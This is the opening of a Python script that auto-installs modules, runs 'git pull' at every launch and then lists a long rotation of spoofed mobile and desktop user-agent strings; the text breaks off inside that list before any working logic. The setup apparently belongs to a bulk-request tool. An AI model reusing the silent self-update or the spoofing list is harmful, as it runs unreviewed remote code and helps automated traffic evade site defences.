#!/usr/bin/python3
#-*-coding:utf-8-*-
import os
try:
	import requests
except ImportError:
	print('\n [×] requests module not installed!...\n')
	os.system('pip install requests')
try:
	import concurrent.futures
except ImportError:
	print('\n [×] Futures module not installed!...\n')
	os.system('pip install futures')
try:
	import bs4
except ImportError:
	print('\n [×] Bs4 module not installed!...\n')
	os.system('pip install bs4')
import os
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import zlib
from time import sleep
import os,sys,time,json,random,re,string,platform,base64,platform
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
from bs4 import BeautifulSoup
R = '\x1b[1;91m' 
G = '\x1b[1;92m' 
Y = '\x1b[1;93m' 
os.system("git pull")
syed = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36",
"AppleCoreMedia/1.0.0.19D52 (iPhone; U; CPU OS 15_3_1 like Mac OS X; nl_nl)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
"Mozilla/5.0 (Linux; Android 12; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; moto g(8) power lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-P355M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; VKY-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; LM-K525) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Twist 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; CPH1809) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11.1.1; Oppo A5 ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36 YaApp_Android/10.30 YaSearchBrowser/10.30",
"Mozilla/5.0 (Linux; Android 8.1.0; CPH1809) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; tr-tr; Redmi Note 7 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.15.2-gn",
"Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-ca; HTC-Vivo Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; HTC-Vivo Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; fr-ca; HTC-Vivo Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.3.0.0",
"Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.2",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
"Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
"Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 12; V2130; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.3",
"Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.1",
"Mozilla/5.0 (Linux; Android 12; V2111; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.3.1",
"Mozilla/5.0 (Linux; Android 12; V2055; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3",
"Mozilla/5.0 (Linux; Android 10; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.2",
"Mozilla/5.0 (Linux; Android 12; V2058; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.3.4",
"Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; V2109; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0",
"Mozilla/5.0 (Linux; Android 12; I2018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.9.3.1",
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.1.0.2",
"Mozilla/5.0 (Linux; Android 11; V2055A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/11.0.10.0",
"Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.4",
"Mozilla/5.0 (Linux; Android 12; V2061; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.12.3.1",
"Mozilla/5.0 (Linux; Android 12; V2038; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0",
"Mozilla/5.0 (Linux; Android 11; V2030; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/7.15.0.4",
"Mozilla/5.0 (Linux; Android 10; vivo 2015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
"Mozilla/5.0 (Linux; Android 9; SM-A307FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 YaApp_Android/9.65 YaSearchBrowser/9.65",
"Mozilla/5.0 (Linux; Android 7.0; P028) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.80 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J106F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.80 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 9; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; RMX1921 Build/PKQ1.190414.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 YaBrowser/18.9.0.489.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; ATU-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.112 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-P3100 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3",
"Mozilla/5.0 (Linux; Android 6.0.1; ASUS_X007D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 8.1.0; en-gb; Redmi Note 6 Pro Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.1.2",
"Mozilla/5.0 (Linux; arm_64; Android 8.1.0; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; BV9000Pro-F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; Tesseract/1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X; Tesseract/1.0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.112 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-A720F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.2.116.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-J701F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; RAINBOW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.56 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; BLADE V8 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A750FN Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-A9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X; Tesseract/1.0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/8.0.57838 Mobile/11D167 Safari/9537.53",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 YaBrowser/17.3.0.373.00 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 44; BTRS100284; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.1)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/46.0.2490.73 Mobile/12B466 Safari/600.1.4",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S6000L-F Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.92 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/6.0 Mobile/10A523 Safari/8536.25",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 YaBrowser/16.9.1.1616.00 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4X Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 YandexSearch/7.10",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 44; GTB7.4; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; eSobiSubscriber 2.0.4.16; .NET4.0C; .NET4.0E)",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S650 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) YaBrowser/15.10.2454.3114.10 Mobile/11D169 Safari/9537.53",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 44; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; HPNTDF; InfoPath.1; .NET4.0C)",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S660 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) GSA/3.1.0.23513 Mobile/11D201 Safari/8536.25",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.9.2246.119956",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S860 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 YaBrowser/13.9.1500.3524 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 44; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.1)",
"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo S960 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.109 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 YaBrowser/17.1.2.339.00 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; MRSPUTNIK 2, 4, 1, 74; BTRS105902; MRA 6.0 (build 5972); Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Me",
"Mozilla/5.0 (Linux; Android 4.2.2; M100qw Build/M100qw_001_16072013_001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Coast/3.0.3.78307 Mobile/11D201 Safari/7534.48.3",
"Mozilla/5.0 (Linux; Android 4.2.2; M100qw Build/master_lie for 4pda.ru 08.02.2014) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.58 Safari/537.31",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1795.0 Safari/537.36",
"Mozilla/5.0 (X11; U; Linux x86_64; en-BE) AppleWebKit/534.35 (KHTML, like Gecko) Chrome/11.0.696.65 Safari/534.35 Puffin/3.10977IT",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/11.0.696.65 Chrome/11.0.696.65 Safari/534.24",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J510FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; CPH1809) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11.1.1; Oppo A5 ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36 YaApp_Android/10.30 YaSearchBrowser/10.30",
"Mozilla/5.0 (Linux; Android 8.1.0; CPH1809) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 9; tr-tr; Redmi Note 7 Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.15.2-gn",
"Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; XIAOMI Mi Note 10 Pro Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.15.0",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-ca; HTC-Vivo Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; HTC-Vivo Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; fr-ca; HTC-Vivo Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2",
